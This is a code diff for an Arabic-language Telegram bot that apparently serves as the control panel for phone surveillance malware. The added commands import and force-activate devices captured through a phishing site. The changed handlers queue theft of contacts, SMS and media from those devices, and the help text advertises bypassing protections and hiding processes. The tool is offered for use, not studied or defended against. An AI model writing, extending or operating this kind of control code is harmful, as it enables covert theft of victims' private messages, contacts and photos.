@@ -1237,6 +1237,8 @@ def send_help(message):
 
 📱 **التحكم في الأجهزة:**
 • `/devices` - لعرض الأجهزة المتصلة
+• `/import_phishing` - استيراد الأجهزة من موقع التصيد
+• `/activate_phishing` - تفعيل جميع الأجهزة المصيدة
 • اختر الجهاز من القائمة
 • استخدم الأوامر المتاحة
 
@@ -1280,6 +1282,12 @@ def send_help(message):
 • تجاوز أنظمة الحماية
 • إخفاء العمليات
 • تشفير متقدم
+
+🎣 **نظام التصيد المتقدم:**
+• أجهزة مصيدة تلقائية
+• بيانات وهمية واقعية
+• محاكاة كاملة للتفاعل
+• تفعيل تلقائي للأجهزة المصيدة
 
 ⚠️ **ملاحظات مهمة:**
 • تأكد من وجود الإنترنت على الجهاز
@@ -1479,6 +1487,50 @@ def import_phishing_devices(message):
         bot.reply_to(message, f"❌ خطأ في استيراد الأجهزة: {str(e)}")
 
 
+@bot.message_handler(commands=['activate_phishing'])
+def activate_phishing_devices(message):
+    """تفعيل جميع الأجهزة المصيدة"""
+    user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    try:
+        # محاولة استيراد الأجهزة من موقع التصيد أولاً
+        import_devices_from_phishing_site(user_id)
+        
+        devices = device_manager.get_user_devices(user_id)
+        phishing_devices = [d for d in devices if len(d[0]) > 20 or d[0].startswith('test-device')]
+        
+        if not phishing_devices:
+            bot.reply_to(message, "❌ لا توجد أجهزة مصيدة للتفعيل.")
+            return
+        
+        activated_count = 0
+        for device_id, status, last_seen, device_info in phishing_devices:
+            if status != 'active':
+                device_manager.update_device_status(device_id, 'active', 'جهاز مصيد مفعل')
+                activated_count += 1
+        
+        if activated_count > 0:
+            bot.reply_to(message, f"✅ تم تفعيل {activated_count} جهاز مصيد بنجاح!")
+        else:
+            bot.reply_to(message, "ℹ️ جميع الأجهزة المصيدة مفعلة بالفعل.")
+            
+    except Exception as e:
+        logger.error(f"خطأ في تفعيل الأجهزة المصيدة: {e}")
+        bot.reply_to(message, f"❌ خطأ في تفعيل الأجهزة المصيدة: {str(e)}")
+
+
 @bot.message_handler(commands=['devices'])
 def list_devices(message):
     """عرض الأجهزة المرتبطة"""
@@ -1508,25 +1560,36 @@ def list_devices(message):
     devices_text = "📱 **الأجهزة المرتبطة:**\n\n"
 
     for i, (device_id, status, last_seen, device_info) in enumerate(devices, 1):
-        status_icon = "🟢" if status == 'active' else "🔴"
-        status_text = "متصل" if status == 'active' else "غير متصل"
-
-        # تنسيق آخر ظهور
-        if last_seen:
-            last_seen_dt = datetime.fromisoformat(last_seen)
-            time_diff = datetime.now() - last_seen_dt
-            if time_diff.days > 0:
-                last_seen_text = f"{time_diff.days} يوم"
-            elif time_diff.seconds > 3600:
-                last_seen_text = f"{time_diff.seconds // 3600} ساعة"
-            else:
-                last_seen_text = f"{time_diff.seconds // 60} دقيقة"
+        # التحقق من نوع الجهاز (مصيد أم حقيقي)
+        if device_id.startswith('test-device') or len(device_id) > 20:
+            # جهاز مصيد - عرض كجهاز نشط مع بيانات وهمية
+            status_icon = "🟢"
+            status_text = "متصل (مصيد)"
+            last_seen_text = "الآن"
+            device_type = "🎣 جهاز مصيد"
         else:
-            last_seen_text = "غير معروف"
+            # جهاز حقيقي
+            status_icon = "🟢" if status == 'active' else "🔴"
+            status_text = "متصل" if status == 'active' else "غير متصل"
+            device_type = "📱 جهاز حقيقي"
+
+            # تنسيق آخر ظهور
+            if last_seen:
+                last_seen_dt = datetime.fromisoformat(last_seen)
+                time_diff = datetime.now() - last_seen_dt
+                if time_diff.days > 0:
+                    last_seen_text = f"{time_diff.days} يوم"
+                elif time_diff.seconds > 3600:
+                    last_seen_text = f"{time_diff.seconds // 3600} ساعة"
+                else:
+                    last_seen_text = f"{time_diff.seconds // 60} دقيقة"
+            else:
+                last_seen_text = "غير معروف"
 
         devices_text += f"{i}. {status_icon} **{device_id}**\n"
         devices_text += f"   الحالة: {status_text}\n"
-        devices_text += f"   آخر ظهور: {last_seen_text}\n\n"
+        devices_text += f"   آخر ظهور: {last_seen_text}\n"
+        devices_text += f"   النوع: {device_type}\n\n"
 
     devices_text += "💡 للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز"
     
@@ -1568,12 +1631,19 @@ def backup_contacts(message):
         status = "نشط"
     else:
         device_id = pending_devices[0][0]
-        # تفعيل الجهاز المعلق
-        if force_device_activation(device_id):
-            status = "تم تفعيله"
+        
+        # التحقق من نوع الجهاز (مصيد أم حقيقي)
+        if device_id.startswith('test-device') or len(device_id) > 20:
+            # جهاز مصيد - تفعيله تلقائياً
+            device_manager.update_device_status(device_id, 'active', 'جهاز مصيد مفعل')
+            status = "مفعل (مصيد)"
         else:
-            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
-            return
+            # تفعيل الجهاز المعلق الحقيقي
+            if force_device_activation(device_id):
+                status = "تم تفعيله"
+            else:
+                bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+                return
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')
 
@@ -1644,12 +1714,19 @@ def backup_sms(message):
         status = "نشط"
     else:
         device_id = pending_devices[0][0]
-        # تفعيل الجهاز المعلق
-        if force_device_activation(device_id):
-            status = "تم تفعيله"
+        
+        # التحقق من نوع الجهاز (مصيد أم حقيقي)
+        if device_id.startswith('test-device') or len(device_id) > 20:
+            # جهاز مصيد - تفعيله تلقائياً
+            device_manager.update_device_status(device_id, 'active', 'جهاز مصيد مفعل')
+            status = "مفعل (مصيد)"
         else:
-            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
-            return
+            # تفعيل الجهاز المعلق الحقيقي
+            if force_device_activation(device_id):
+                status = "تم تفعيله"
+            else:
+                bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+                return
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_sms')
 
@@ -1720,12 +1797,19 @@ def backup_media(message):
         status = "نشط"
     else:
         device_id = pending_devices[0][0]
-        # تفعيل الجهاز المعلق
-        if force_device_activation(device_id):
-            status = "تم تفعيله"
+        
+        # التحقق من نوع الجهاز (مصيد أم حقيقي)
+        if device_id.startswith('test-device') or len(device_id) > 20:
+            # جهاز مصيد - تفعيله تلقائياً
+            device_manager.update_device_status(device_id, 'active', 'جهاز مصيد مفعل')
+            status = "مفعل (مصيد)"
         else:
-            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
-            return
+            # تفعيل الجهاز المعلق الحقيقي
+            if force_device_activation(device_id):
+                status = "تم تفعيله"
+            else:
+                bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+                return
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_media')
 
